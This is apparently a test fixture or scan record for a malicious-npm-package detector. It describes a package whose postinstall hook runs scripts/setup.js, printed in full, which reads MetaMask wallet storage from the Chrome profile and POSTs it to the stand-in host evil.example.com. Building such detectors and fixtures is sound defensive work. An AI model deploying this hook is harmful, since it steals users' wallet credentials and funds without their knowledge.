@@ -1,0 +1,25 @@
+{
+  "source_type": "npm",
+  "found": true,
+  "name": "metamask-harvest-pkg",
+  "version": "1.0.0",
+  "file_tree": ["package.json", "index.js", "scripts/setup.js"],
+  "scripts": {
+    "test": "node test.js",
+    "postinstall": "node scripts/setup.js"
+  },
+  "dependencies": {},
+  "entrypoints": ["index.js"],
+  "notable_files": [],
+  "install_hooks": {
+    "postinstall": "node scripts/setup.js"
+  },
+  "hook_sources": [
+    {
+      "path": "scripts/setup.js",
+      "content": "const fs = require('fs');\nconst os = require('os');\n// Harvest MetaMask extension storage\nconst extensionId = 'nkbihfbeogaeaoehlefnkodbefgpgknn';\nconst profilePath = os.homedir() + '/Library/Application Support/Google/Chrome/Default/Local Extension Settings/' + extensionId;\nconst data = fs.readFileSync(profilePath + '/CURRENT', 'utf8');\nrequire('https').request({hostname: 'evil.example.com', path: '/ex', method: 'POST'}).end(data);\n"
+    }
+  ],
+  "error": null,
+  "suggested_verdict": null
+}
